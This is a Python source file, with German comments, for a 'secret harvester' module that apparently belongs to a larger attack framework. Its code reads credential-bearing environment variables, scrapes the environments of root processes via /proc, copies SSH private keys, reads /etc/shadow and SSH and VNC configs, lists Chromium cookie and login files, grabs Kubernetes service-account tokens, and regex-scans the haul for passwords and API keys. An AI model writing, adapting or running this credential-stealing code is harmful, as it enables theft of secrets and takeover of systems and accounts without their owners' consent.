"""
JAYJAY SECRET HARVESTER — Vollständige Secrets-Extraktion
Environment, /proc, Configs, SSH, Chrome, Kernel
"""
import os, re, glob, json
from datetime import datetime

class SecretHarvester:
    """Erntet alle Secrets aus dem System."""

    SECRET_PATTERNS = [
        (r'(?i)(password|passwd|pwd)\s*[=:]\s*([^\s\n\r]+)', 'PASSWORD'),
        (r'(?i)(api[_-]?key|apikey)\s*[=:]\s*([^\s\n\r]+)', 'API_KEY'),
        (r'(?i)(secret[_-]?key|secretkey)\s*[=:]\s*([^\s\n\r]+)', 'SECRET_KEY'),
        (r'(?i)(token|auth[_-]?token|access[_-]?token)\s*[=:]\s*([^\s\n\r]+)', 'TOKEN'),
        (r'(?i)(private[_-]?key|privkey)\s*[=:]\s*([^\s\n\r]+)', 'PRIVATE_KEY'),
        (r'(?i)(client[_-]?id)\s*[=:]\s*([^\s\n\r]+)', 'CLIENT_ID'),
        (r'(?i)(client[_-]?secret)\s*[=:]\s*([^\s\n\r]+)', 'CLIENT_SECRET'),
        (r'(?i)(gpg[_-]?key)\s*[=:]\s*([^\s\n\r]+)', 'GPG_KEY'),
        (r'(?i)(ssh[_-]?password|vnc[_-]?password)\s*[=:]\s*([^\s\n\r]+)', 'CREDENTIAL'),
        (r'(?i)(kubernetes|k8s).*?(token|host)', 'K8S'),
        (r'(?i)(proxy[_-]?server)\s*[=:]\s*([^\s\n\r]+)', 'PROXY'),
    ]

    def __init__(self, core):
        self.core = core
        self.secrets = {}

    def harvest_all(self):
        self.core.log("INFO", "Starting full secret harvest", "SECRETS")
        self.secrets = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "environment": self._harvest_env(),
            "proc_environ": self._harvest_proc_environ(),
            "ssh_keys": self._harvest_ssh_keys(),
            "configs": self._harvest_configs(),
            "kernel_files": self._harvest_kernel_files(),
            "chrome_data": self._harvest_chrome_data(),
            "k8s_tokens": self._harvest_k8s_tokens(),
            "patterns_found": []
        }
        self._scan_patterns()
        self.core.state["secrets"] = self.secrets
        self.core.register_vector("SECRETS", "ACTIVE", {"count": len(self.secrets)})
        return self.secrets

    def _harvest_env(self):
        return {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ['PASS','KEY','TOKEN','SECRET','AUTH','CRED','API','PROXY','KUBERNETES'])}

    def _harvest_proc_environ(self):
        root_envs = {}
        for pid in os.listdir('/proc'):
            if pid.isdigit():
                try:
                    with open(f'/proc/{pid}/status') as f:
                        if 'Uid:\t0' in f.read():
                            with open(f'/proc/{pid}/environ', 'rb') as f2:
                                env = f2.read().decode('utf-8', errors='ignore').split('\x00')
                            secrets = [e for e in env if any(x in e.upper() for x in ['PASS','KEY','TOKEN','SECRET'])]
                            if secrets:
                                root_envs[pid] = secrets
                except:
                    pass
        return root_envs

    def _harvest_ssh_keys(self):
        keys = {}
        for user_dir in ['/root', '/home/kimi']:
            ssh_dir = os.path.join(user_dir, '.ssh')
            if os.path.isdir(ssh_dir):
                keys[user_dir] = {}
                for f in os.listdir(ssh_dir):
                    try:
                        with open(os.path.join(ssh_dir, f)) as fh:
                            keys[user_dir][f] = fh.read()
                    except:
                        pass
        return keys

    def _harvest_configs(self):
        configs = {}
        for path in ['/etc/kasmvnc/kasmvnc.yaml', '/etc/ssh/sshd_config', '/etc/passwd', '/etc/shadow']:
            try:
                with open(path) as f:
                    configs[path] = f.read()
            except:
                pass
        return configs

    def _harvest_kernel_files(self):
        files = glob.glob("/tmp/tmp*.json")
        data = {}
        for f in files:
            try:
                with open(f) as fh:
                    data[f] = json.load(fh)
            except:
                pass
        return data

    def _harvest_chrome_data(self):
        chrome_paths = glob.glob("/home/kimi/.config/chromium/*/")
        data = {}
        for p in chrome_paths:
            for sub in ['Cookies', 'Login Data', 'Local State', 'Preferences']:
                fp = os.path.join(p, sub)
                if os.path.exists(fp):
                    data[fp] = os.path.getsize(fp)
        return data

    def _harvest_k8s_tokens(self):
        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if os.path.exists(token_path):
            try:
                with open(token_path) as f:
                    return {"token": f.read(), "namespace": open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read()}
            except:
                pass
        return {"found": False}

    def _scan_patterns(self):
        all_text = json.dumps(self.secrets)
        for pattern, label in self.SECRET_PATTERNS:
            for match in re.finditer(pattern, all_text):
                self.secrets["patterns_found"].append({"type": label, "match": match.group(0)})
